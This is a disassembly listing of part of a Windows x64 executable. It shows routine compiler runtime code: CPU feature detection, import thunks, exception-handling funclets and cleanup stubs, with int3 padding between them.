   140007c61:	8b 05 35 64 00 00    	mov    0x6435(%rip),%eax        # 0x14000e09c
   140007c67:	b2 e0                	mov    $0xe0,%dl
   140007c69:	83 c8 08             	or     $0x8,%eax
   140007c6c:	c7 05 22 64 00 00 03 	movl   $0x3,0x6422(%rip)        # 0x14000e098
   140007c73:	00 00 00 
   140007c76:	89 05 20 64 00 00    	mov    %eax,0x6420(%rip)        # 0x14000e09c
   140007c7c:	41 f6 c1 20          	test   $0x20,%r9b
   140007c80:	74 62                	je     0x140007ce4
   140007c82:	83 c8 20             	or     $0x20,%eax
   140007c85:	c7 05 09 64 00 00 05 	movl   $0x5,0x6409(%rip)        # 0x14000e098
   140007c8c:	00 00 00 
   140007c8f:	89 05 07 64 00 00    	mov    %eax,0x6407(%rip)        # 0x14000e09c
   140007c95:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140007c9a:	48 8b 05 ef 63 00 00 	mov    0x63ef(%rip),%rax        # 0x14000e090
   140007ca1:	44 23 c9             	and    %ecx,%r9d
   140007ca4:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140007ca8:	48 89 05 e1 63 00 00 	mov    %rax,0x63e1(%rip)        # 0x14000e090
   140007caf:	44 3b c9             	cmp    %ecx,%r9d
   140007cb2:	75 37                	jne    0x140007ceb
   140007cb4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007cb9:	22 c2                	and    %dl,%al
   140007cbb:	3a c2                	cmp    %dl,%al
   140007cbd:	75 25                	jne    0x140007ce4
   140007cbf:	48 8b 05 ca 63 00 00 	mov    0x63ca(%rip),%rax        # 0x14000e090
   140007cc6:	83 0d cf 63 00 00 40 	orl    $0x40,0x63cf(%rip)        # 0x14000e09c
   140007ccd:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140007cd1:	c7 05 bd 63 00 00 06 	movl   $0x6,0x63bd(%rip)        # 0x14000e098
   140007cd8:	00 00 00 
   140007cdb:	48 89 05 ae 63 00 00 	mov    %rax,0x63ae(%rip)        # 0x14000e090
   140007ce2:	eb 07                	jmp    0x140007ceb
   140007ce4:	48 8b 05 a5 63 00 00 	mov    0x63a5(%rip),%rax        # 0x14000e090
   140007ceb:	0f ba e6 17          	bt     $0x17,%esi
   140007cef:	73 0c                	jae    0x140007cfd
   140007cf1:	48 0f ba f0 18       	btr    $0x18,%rax
   140007cf6:	48 89 05 93 63 00 00 	mov    %rax,0x6393(%rip)        # 0x14000e090
   140007cfd:	41 0f ba e2 13       	bt     $0x13,%r10d
   140007d02:	73 4a                	jae    0x140007d4e
   140007d04:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007d09:	22 c2                	and    %dl,%al
   140007d0b:	3a c2                	cmp    %dl,%al
   140007d0d:	75 3f                	jne    0x140007d4e
   140007d0f:	41 8b cb             	mov    %r11d,%ecx
   140007d12:	41 8b c3             	mov    %r11d,%eax
   140007d15:	48 c1 e9 10          	shr    $0x10,%rcx
   140007d19:	25 ff 00 04 00       	and    $0x400ff,%eax
   140007d1e:	83 e1 06             	and    $0x6,%ecx
   140007d21:	89 05 45 6c 00 00    	mov    %eax,0x6c45(%rip)        # 0x14000e96c
   140007d27:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140007d2e:	48 f7 d1             	not    %rcx
   140007d31:	48 23 0d 58 63 00 00 	and    0x6358(%rip),%rcx        # 0x14000e090
   140007d38:	48 89 0d 51 63 00 00 	mov    %rcx,0x6351(%rip)        # 0x14000e090
   140007d3f:	3c 01                	cmp    $0x1,%al
   140007d41:	76 0b                	jbe    0x140007d4e
   140007d43:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140007d47:	48 89 0d 42 63 00 00 	mov    %rcx,0x6342(%rip)        # 0x14000e090
   140007d4e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140007d53:	73 15                	jae    0x140007d6a
   140007d55:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007d5a:	48 0f ba e0 13       	bt     $0x13,%rax
   140007d5f:	73 09                	jae    0x140007d6a
   140007d61:	48 0f ba 35 26 63 00 	btrq   $0x7,0x6326(%rip)        # 0x14000e090
   140007d68:	00 07 
   140007d6a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140007d6f:	33 c0                	xor    %eax,%eax
   140007d71:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140007d76:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007d7b:	48 83 c4 10          	add    $0x10,%rsp
   140007d7f:	5f                   	pop    %rdi
   140007d80:	c3                   	ret
   140007d81:	cc                   	int3
   140007d82:	cc                   	int3
   140007d83:	cc                   	int3
   140007d84:	33 c0                	xor    %eax,%eax
   140007d86:	39 05 24 63 00 00    	cmp    %eax,0x6324(%rip)        # 0x14000e0b0
   140007d8c:	0f 95 c0             	setne  %al
   140007d8f:	c3                   	ret
   140007d90:	48 83 ec 28          	sub    $0x28,%rsp
   140007d94:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140007d98:	48 8b ca             	mov    %rdx,%rcx
   140007d9b:	49 8b d1             	mov    %r9,%rdx
   140007d9e:	e8 0d 00 00 00       	call   0x140007db0
   140007da3:	b8 01 00 00 00       	mov    $0x1,%eax
   140007da8:	48 83 c4 28          	add    $0x28,%rsp
   140007dac:	c3                   	ret
   140007dad:	cc                   	int3
   140007dae:	cc                   	int3
   140007daf:	cc                   	int3
   140007db0:	40 53                	rex push %rbx
   140007db2:	45 8b 18             	mov    (%r8),%r11d
   140007db5:	48 8b da             	mov    %rdx,%rbx
   140007db8:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140007dbc:	4c 8b c9             	mov    %rcx,%r9
   140007dbf:	41 f6 00 04          	testb  $0x4,(%r8)
   140007dc3:	4c 8b d1             	mov    %rcx,%r10
   140007dc6:	74 13                	je     0x140007ddb
   140007dc8:	41 8b 40 08          	mov    0x8(%r8),%eax
   140007dcc:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140007dd0:	f7 d8                	neg    %eax
   140007dd2:	4c 03 d1             	add    %rcx,%r10
   140007dd5:	48 63 c8             	movslq %eax,%rcx
   140007dd8:	4c 23 d1             	and    %rcx,%r10
   140007ddb:	49 63 c3             	movslq %r11d,%rax
   140007dde:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140007de2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140007de6:	8b 48 08             	mov    0x8(%rax),%ecx
   140007de9:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007ded:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140007df2:	74 10                	je     0x140007e04
   140007df4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140007df9:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140007dfe:	48 23 c1             	and    %rcx,%rax
   140007e01:	4c 03 c8             	add    %rax,%r9
   140007e04:	4c 33 ca             	xor    %rdx,%r9
   140007e07:	49 8b c9             	mov    %r9,%rcx
   140007e0a:	5b                   	pop    %rbx
   140007e0b:	e9 b0 f0 ff ff       	jmp    0x140006ec0
   140007e10:	ff 25 32 16 00 00    	jmp    *0x1632(%rip)        # 0x140009448
   140007e16:	ff 25 f4 15 00 00    	jmp    *0x15f4(%rip)        # 0x140009410
   140007e1c:	ff 25 e6 15 00 00    	jmp    *0x15e6(%rip)        # 0x140009408
   140007e22:	ff 25 d8 15 00 00    	jmp    *0x15d8(%rip)        # 0x140009400
   140007e28:	ff 25 ca 15 00 00    	jmp    *0x15ca(%rip)        # 0x1400093f8
   140007e2e:	ff 25 bc 15 00 00    	jmp    *0x15bc(%rip)        # 0x1400093f0
   140007e34:	ff 25 f6 15 00 00    	jmp    *0x15f6(%rip)        # 0x140009430
   140007e3a:	ff 25 08 17 00 00    	jmp    *0x1708(%rip)        # 0x140009548
   140007e40:	ff 25 4a 16 00 00    	jmp    *0x164a(%rip)        # 0x140009490
   140007e46:	ff 25 34 16 00 00    	jmp    *0x1634(%rip)        # 0x140009480
   140007e4c:	ff 25 36 16 00 00    	jmp    *0x1636(%rip)        # 0x140009488
   140007e52:	ff 25 d0 16 00 00    	jmp    *0x16d0(%rip)        # 0x140009528
   140007e58:	ff 25 d2 16 00 00    	jmp    *0x16d2(%rip)        # 0x140009530
   140007e5e:	ff 25 54 16 00 00    	jmp    *0x1654(%rip)        # 0x1400094b8
   140007e64:	ff 25 8e 16 00 00    	jmp    *0x168e(%rip)        # 0x1400094f8
   140007e6a:	ff 25 e0 16 00 00    	jmp    *0x16e0(%rip)        # 0x140009550
   140007e70:	ff 25 ca 16 00 00    	jmp    *0x16ca(%rip)        # 0x140009540
   140007e76:	ff 25 bc 16 00 00    	jmp    *0x16bc(%rip)        # 0x140009538
   140007e7c:	ff 25 7e 16 00 00    	jmp    *0x167e(%rip)        # 0x140009500
   140007e82:	ff 25 68 16 00 00    	jmp    *0x1668(%rip)        # 0x1400094f0
   140007e88:	ff 25 3a 16 00 00    	jmp    *0x163a(%rip)        # 0x1400094c8
   140007e8e:	ff 25 1c 17 00 00    	jmp    *0x171c(%rip)        # 0x1400095b0
   140007e94:	ff 25 3e 16 00 00    	jmp    *0x163e(%rip)        # 0x1400094d8
   140007e9a:	ff 25 40 16 00 00    	jmp    *0x1640(%rip)        # 0x1400094e0
   140007ea0:	ff 25 42 16 00 00    	jmp    *0x1642(%rip)        # 0x1400094e8
   140007ea6:	ff 25 fc 15 00 00    	jmp    *0x15fc(%rip)        # 0x1400094a8
   140007eac:	ff 25 e6 15 00 00    	jmp    *0x15e6(%rip)        # 0x140009498
   140007eb2:	ff 25 e0 16 00 00    	jmp    *0x16e0(%rip)        # 0x140009598
   140007eb8:	ff 25 4a 16 00 00    	jmp    *0x164a(%rip)        # 0x140009508
   140007ebe:	ff 25 4c 16 00 00    	jmp    *0x164c(%rip)        # 0x140009510
   140007ec4:	ff 25 4e 16 00 00    	jmp    *0x164e(%rip)        # 0x140009518
   140007eca:	cc                   	int3
   140007ecb:	cc                   	int3
   140007ecc:	48 8b c4             	mov    %rsp,%rax
   140007ecf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007ed3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007ed7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007edb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007edf:	41 56                	push   %r14
   140007ee1:	48 83 ec 20          	sub    $0x20,%rsp
   140007ee5:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140007ee9:	48 8b f2             	mov    %rdx,%rsi
   140007eec:	4d 8b f0             	mov    %r8,%r14
   140007eef:	48 8b e9             	mov    %rcx,%rbp
   140007ef2:	49 8b d1             	mov    %r9,%rdx
   140007ef5:	48 8b ce             	mov    %rsi,%rcx
   140007ef8:	49 8b f9             	mov    %r9,%rdi
   140007efb:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140007eff:	e8 ac fe ff ff       	call   0x140007db0
   140007f04:	8b 45 04             	mov    0x4(%rbp),%eax
   140007f07:	24 66                	and    $0x66,%al
   140007f09:	f6 d8                	neg    %al
   140007f0b:	b8 01 00 00 00       	mov    $0x1,%eax
   140007f10:	45 1b c9             	sbb    %r9d,%r9d
   140007f13:	41 f7 d9             	neg    %r9d
   140007f16:	44 03 c8             	add    %eax,%r9d
   140007f19:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140007f1d:	74 11                	je     0x140007f30
   140007f1f:	4c 8b cf             	mov    %rdi,%r9
   140007f22:	4d 8b c6             	mov    %r14,%r8
   140007f25:	48 8b d6             	mov    %rsi,%rdx
   140007f28:	48 8b cd             	mov    %rbp,%rcx
   140007f2b:	e8 e0 fe ff ff       	call   0x140007e10
   140007f30:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007f35:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007f3a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007f3f:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140007f44:	48 83 c4 20          	add    $0x20,%rsp
   140007f48:	41 5e                	pop    %r14
   140007f4a:	c3                   	ret
   140007f4b:	ff 25 d7 14 00 00    	jmp    *0x14d7(%rip)        # 0x140009428
   140007f51:	ff 25 e1 14 00 00    	jmp    *0x14e1(%rip)        # 0x140009438
   140007f57:	cc                   	int3
   140007f58:	cc                   	int3
   140007f59:	cc                   	int3
   140007f5a:	cc                   	int3
   140007f5b:	cc                   	int3
   140007f5c:	cc                   	int3
   140007f5d:	cc                   	int3
   140007f5e:	cc                   	int3
   140007f5f:	cc                   	int3
   140007f60:	cc                   	int3
   140007f61:	cc                   	int3
   140007f62:	cc                   	int3
   140007f63:	cc                   	int3
   140007f64:	cc                   	int3
   140007f65:	cc                   	int3
   140007f66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007f6d:	00 00 00 
   140007f70:	ff e0                	jmp    *%rax
   140007f72:	cc                   	int3
   140007f73:	cc                   	int3
   140007f74:	cc                   	int3
   140007f75:	cc                   	int3
   140007f76:	cc                   	int3
   140007f77:	cc                   	int3
   140007f78:	cc                   	int3
   140007f79:	cc                   	int3
   140007f7a:	cc                   	int3
   140007f7b:	cc                   	int3
   140007f7c:	cc                   	int3
   140007f7d:	cc                   	int3
   140007f7e:	cc                   	int3
   140007f7f:	cc                   	int3
   140007f80:	cc                   	int3
   140007f81:	cc                   	int3
   140007f82:	cc                   	int3
   140007f83:	cc                   	int3
   140007f84:	cc                   	int3
   140007f85:	cc                   	int3
   140007f86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007f8d:	00 00 00 
   140007f90:	ff 25 ca 16 00 00    	jmp    *0x16ca(%rip)        # 0x140009660
   140007f96:	cc                   	int3
   140007f97:	cc                   	int3
   140007f98:	cc                   	int3
   140007f99:	cc                   	int3
   140007f9a:	cc                   	int3
   140007f9b:	cc                   	int3
   140007f9c:	cc                   	int3
   140007f9d:	cc                   	int3
   140007f9e:	cc                   	int3
   140007f9f:	cc                   	int3
   140007fa0:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007fa7:	e9 f4 93 ff ff       	jmp    0x1400013a0
   140007fac:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007fb3:	e9 e8 93 ff ff       	jmp    0x1400013a0
   140007fb8:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140007fbf:	e9 dc 93 ff ff       	jmp    0x1400013a0
   140007fc4:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140007fcb:	e9 d0 93 ff ff       	jmp    0x1400013a0
   140007fd0:	40 55                	rex push %rbp
   140007fd2:	48 83 ec 20          	sub    $0x20,%rsp
   140007fd6:	48 8b ea             	mov    %rdx,%rbp
   140007fd9:	ba 18 00 00 00       	mov    $0x18,%edx
   140007fde:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007fe2:	e8 f9 ee ff ff       	call   0x140006ee0
   140007fe7:	48 83 c4 20          	add    $0x20,%rsp
   140007feb:	5d                   	pop    %rbp
   140007fec:	c3                   	ret
   140007fed:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007ff4:	e9 37 93 ff ff       	jmp    0x140001330
   140007ff9:	40 55                	rex push %rbp
   140007ffb:	48 83 ec 20          	sub    $0x20,%rsp
   140007fff:	48 8b ea             	mov    %rdx,%rbp
   140008002:	ba 18 00 00 00       	mov    $0x18,%edx
   140008007:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000800b:	e8 d0 ee ff ff       	call   0x140006ee0
   140008010:	48 83 c4 20          	add    $0x20,%rsp
   140008014:	5d                   	pop    %rbp
   140008015:	c3                   	ret
   140008016:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   14000801d:	e9 0e 93 ff ff       	jmp    0x140001330
   140008022:	40 55                	rex push %rbp
   140008024:	48 83 ec 20          	sub    $0x20,%rsp
   140008028:	48 8b ea             	mov    %rdx,%rbp
   14000802b:	ba 18 00 00 00       	mov    $0x18,%edx
   140008030:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140008034:	e8 a7 ee ff ff       	call   0x140006ee0
   140008039:	48 83 c4 20          	add    $0x20,%rsp
   14000803d:	5d                   	pop    %rbp
   14000803e:	c3                   	ret
   14000803f:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140008046:	e9 e5 92 ff ff       	jmp    0x140001330
   14000804b:	40 55                	rex push %rbp
   14000804d:	48 83 ec 20          	sub    $0x20,%rsp
   140008051:	48 8b ea             	mov    %rdx,%rbp
   140008054:	ba 18 00 00 00       	mov    $0x18,%edx
   140008059:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000805d:	e8 7e ee ff ff       	call   0x140006ee0
   140008062:	48 83 c4 20          	add    $0x20,%rsp
   140008066:	5d                   	pop    %rbp
   140008067:	c3                   	ret
   140008068:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   14000806f:	e9 bc 92 ff ff       	jmp    0x140001330
   140008074:	40 55                	rex push %rbp
   140008076:	48 83 ec 20          	sub    $0x20,%rsp
   14000807a:	48 8b ea             	mov    %rdx,%rbp
   14000807d:	ba 18 00 00 00       	mov    $0x18,%edx
   140008082:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140008086:	e8 55 ee ff ff       	call   0x140006ee0
   14000808b:	48 83 c4 20          	add    $0x20,%rsp
   14000808f:	5d                   	pop    %rbp
   140008090:	c3                   	ret
   140008091:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140008098:	e9 93 92 ff ff       	jmp    0x140001330
   14000809d:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   1400080a4:	e9 f7 92 ff ff       	jmp    0x1400013a0
   1400080a9:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   1400080b0:	e9 eb 92 ff ff       	jmp    0x1400013a0
   1400080b5:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   1400080bc:	e9 df 92 ff ff       	jmp    0x1400013a0
   1400080c1:	40 55                	rex push %rbp
   1400080c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400080c7:	48 8b ea             	mov    %rdx,%rbp
   1400080ca:	ba 18 00 00 00       	mov    $0x18,%edx
   1400080cf:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400080d3:	e8 08 ee ff ff       	call   0x140006ee0
   1400080d8:	48 83 c4 20          	add    $0x20,%rsp
   1400080dc:	5d                   	pop    %rbp
   1400080dd:	c3                   	ret
   1400080de:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   1400080e5:	e9 46 92 ff ff       	jmp    0x140001330
   1400080ea:	cc                   	int3
   1400080eb:	cc                   	int3
   1400080ec:	cc                   	int3
   1400080ed:	cc                   	int3
   1400080ee:	cc                   	int3
   1400080ef:	cc                   	int3
   1400080f0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400080f7:	e9 a4 cc ff ff       	jmp    0x140004da0
   1400080fc:	cc                   	int3
   1400080fd:	cc                   	int3
   1400080fe:	cc                   	int3
   1400080ff:	cc                   	int3
   140008100:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140008107:	e9 24 cc ff ff       	jmp    0x140004d30
   14000810c:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140008113:	e9 f8 b4 ff ff       	jmp    0x140003610
   140008118:	cc                   	int3
   140008119:	cc                   	int3
   14000811a:	cc                   	int3
   14000811b:	cc                   	int3
   14000811c:	cc                   	int3
   14000811d:	cc                   	int3
   14000811e:	cc                   	int3
   14000811f:	cc                   	int3
   140008120:	48 8d 8a 90 01 00 00 	lea    0x190(%rdx),%rcx
   140008127:	e9 74 cc ff ff       	jmp    0x140004da0
   14000812c:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   140008133:	e9 68 cc ff ff       	jmp    0x140004da0
   140008138:	48 8d 8a 60 00 00 00 	lea    0x60(%rdx),%rcx
   14000813f:	e9 5c cc ff ff       	jmp    0x140004da0
   140008144:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   14000814b:	e9 50 cc ff ff       	jmp    0x140004da0
   140008150:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   140008157:	e9 44 cc ff ff       	jmp    0x140004da0
   14000815c:	48 8d 8a c0 00 00 00 	lea    0xc0(%rdx),%rcx
   140008163:	e9 38 cc ff ff       	jmp    0x140004da0
   140008168:	48 8d 8a e0 00 00 00 	lea    0xe0(%rdx),%rcx
   14000816f:	e9 2c cc ff ff       	jmp    0x140004da0
   140008174:	40 55                	rex push %rbp
   140008176:	48 83 ec 20          	sub    $0x20,%rsp
   14000817a:	48 8b ea             	mov    %rdx,%rbp
   14000817d:	4c 8d 0d 1c cc ff ff 	lea    -0x33e4(%rip),%r9        # 0x140004da0
   140008184:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000818a:	ba 20 00 00 00       	mov    $0x20,%edx
   14000818f:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140008193:	e8 8c ed ff ff       	call   0x140006f24
   140008198:	48 83 c4 20          	add    $0x20,%rsp
   14000819c:	5d                   	pop    %rbp
   14000819d:	c3                   	ret
   14000819e:	48 8d 8a 38 01 00 00 	lea    0x138(%rdx),%rcx
   1400081a5:	e9 b6 e7 ff ff       	jmp    0x140006960
   1400081aa:	48 8d 8a 70 01 00 00 	lea    0x170(%rdx),%rcx
   1400081b1:	e9 6a cb ff ff       	jmp    0x140004d20
   1400081b6:	cc                   	int3
   1400081b7:	cc                   	int3
   1400081b8:	cc                   	int3
   1400081b9:	cc                   	int3
   1400081ba:	cc                   	int3
   1400081bb:	cc                   	int3
   1400081bc:	cc                   	int3
   1400081bd:	cc                   	int3
   1400081be:	cc                   	int3
   1400081bf:	cc                   	int3
   1400081c0:	40 55                	rex push %rbp
   1400081c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400081c6:	48 8b ea             	mov    %rdx,%rbp
   1400081c9:	8b 45 20             	mov    0x20(%rbp),%eax
   1400081cc:	83 e0 01             	and    $0x1,%eax
   1400081cf:	85 c0                	test   %eax,%eax
   1400081d1:	74 15                	je     0x1400081e8
   1400081d3:	83 65 20 fe          	andl   $0xfffffffe,0x20(%rbp)
   1400081d7:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400081db:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   1400081e2:	ff 15 d0 0f 00 00    	call   *0xfd0(%rip)        # 0x1400091b8
   1400081e8:	48 83 c4 20          	add    $0x20,%rsp
   1400081ec:	5d                   	pop    %rbp
   1400081ed:	c3                   	ret
   1400081ee:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   1400081f5:	48 83 c1 10          	add    $0x10,%rcx
   1400081f9:	48 ff 25 90 0f 00 00 	rex.W jmp *0xf90(%rip)        # 0x140009190
   140008200:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140008207:	48 83 c1 08          	add    $0x8,%rcx
   14000820b:	e9 e0 db ff ff       	jmp    0x140005df0
   140008210:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140008217:	e9 b4 91 ff ff       	jmp    0x1400013d0
   14000821c:	cc                   	int3
   14000821d:	cc                   	int3
   14000821e:	cc                   	int3
   14000821f:	cc                   	int3
   140008220:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140008227:	e9 44 cd ff ff       	jmp    0x140004f70
   14000822c:	cc                   	int3
   14000822d:	cc                   	int3
   14000822e:	cc                   	int3
   14000822f:	cc                   	int3
   140008230:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140008237:	48 ff 25 a2 0f 00 00 	rex.W jmp *0xfa2(%rip)        # 0x1400091e0
   14000823e:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140008245:	e9 46 e1 ff ff       	jmp    0x140006390
   14000824a:	cc                   	int3
   14000824b:	cc                   	int3
   14000824c:	cc                   	int3
   14000824d:	cc                   	int3
   14000824e:	cc                   	int3
   14000824f:	cc                   	int3
   140008250:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140008257:	e9 c4 e8 ff ff       	jmp    0x140006b20
   14000825c:	40 55                	rex push %rbp
   14000825e:	48 83 ec 20          	sub    $0x20,%rsp
   140008262:	48 8b ea             	mov    %rdx,%rbp
   140008265:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   140008269:	75 16                	jne    0x140008281
   14000826b:	4c 8b 4d 78          	mov    0x78(%rbp),%r9
   14000826f:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   140008273:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140008277:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000827b:	e8 10 ed ff ff       	call   0x140006f90
   140008280:	90                   	nop
   140008281:	48 83 c4 20          	add    $0x20,%rsp
   140008285:	5d                   	pop    %rbp
   140008286:	c3                   	ret
   140008287:	cc                   	int3
   140008288:	40 53                	rex push %rbx
   14000828a:	55                   	push   %rbp
   14000828b:	48 83 ec 28          	sub    $0x28,%rsp
   14000828f:	48 8b ea             	mov    %rdx,%rbp
   140008292:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   140008296:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000829a:	48 8b 08             	mov    (%rax),%rcx
   14000829d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   1400082a1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400082a5:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   1400082ab:	74 0c                	je     0x1400082b9
   1400082ad:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   1400082b4:	8b 45 20             	mov    0x20(%rbp),%eax
   1400082b7:	eb 22                	jmp    0x1400082db
   1400082b9:	e8 6a fb ff ff       	call   0x140007e28
   1400082be:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1400082c2:	48 89 08             	mov    %rcx,(%rax)
   1400082c5:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400082c9:	48 8b 58 08          	mov    0x8(%rax),%rbx
   1400082cd:	e8 5c fb ff ff       	call   0x140007e2e
   1400082d2:	48 89 18             	mov    %rbx,(%rax)
   1400082d5:	e8 60 fb ff ff       	call   0x140007e3a
   1400082da:	90                   	nop
   1400082db:	48 83 c4 28          	add    $0x28,%rsp
   1400082df:	5d                   	pop    %rbp
   1400082e0:	5b                   	pop    %rbx
   1400082e1:	c3                   	ret
   1400082e2:	cc                   	int3
   1400082e3:	40 55                	rex push %rbp
   1400082e5:	48 83 ec 20          	sub    $0x20,%rsp
   1400082e9:	48 8b ea             	mov    %rdx,%rbp
   1400082ec:	48 8b d1             	mov    %rcx,%rdx
   1400082ef:	48 8b 09             	mov    (%rcx),%rcx
   1400082f2:	8b 09                	mov    (%rcx),%ecx
   1400082f4:	e8 59 fb ff ff       	call   0x140007e52
   1400082f9:	90                   	nop
   1400082fa:	48 83 c4 20          	add    $0x20,%rsp
   1400082fe:	5d                   	pop    %rbp
   1400082ff:	c3                   	ret
   140008300:	cc                   	int3
   140008301:	40 55                	rex push %rbp
   140008303:	48 8b ea             	mov    %rdx,%rbp
   140008306:	48 8b 01             	mov    (%rcx),%rax
   140008309:	33 c9                	xor    %ecx,%ecx
   14000830b:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140008311:	0f 94 c1             	sete   %cl
   140008314:	8b c1                	mov    %ecx,%eax
   140008316:	5d                   	pop    %rbp
   140008317:	c3                   	ret
   140008318:	cc                   	int3
   140008319:	cc                   	int3
   14000831a:	cc                   	int3
   14000831b:	cc                   	int3
   14000831c:	40 53                	rex push %rbx
   14000831e:	48 83 ec 20          	sub    $0x20,%rsp
   140008322:	eb 3d                	jmp    0x140008361
   140008324:	48 8b 03             	mov    (%rbx),%rax
   140008327:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000832b:	48 89 05 4e 60 00 00 	mov    %rax,0x604e(%rip)        # 0x14000e380
   140008332:	48 8b 01             	mov    (%rcx),%rax
   140008335:	48 8b 40 10          	mov    0x10(%rax),%rax
   140008339:	ff 15 21 13 00 00    	call   *0x1321(%rip)        # 0x140009660
   14000833f:	48 8b c8             	mov    %rax,%rcx
   140008342:	48 85 c0             	test   %rax,%rax
   140008345:	74 11                	je     0x140008358
   140008347:	48 8b 10             	mov    (%rax),%rdx
   14000834a:	48 8b 02             	mov    (%rdx),%rax
   14000834d:	ba 01 00 00 00       	mov    $0x1,%edx
   140008352:	ff 15 08 13 00 00    	call   *0x1308(%rip)        # 0x140009660
   140008358:	48 8b cb             	mov    %rbx,%rcx
   14000835b:	ff 15 2f 11 00 00    	call   *0x112f(%rip)        # 0x140009490
   140008361:	48 8b 1d 18 60 00 00 	mov    0x6018(%rip),%rbx        # 0x14000e380
   140008368:	48 85 db             	test   %rbx,%rbx
   14000836b:	75 b7                	jne    0x140008324
   14000836d:	48 83 c4 20          	add    $0x20,%rsp
   140008371:	5b                   	pop    %rbx
   140008372:	c3                   	ret
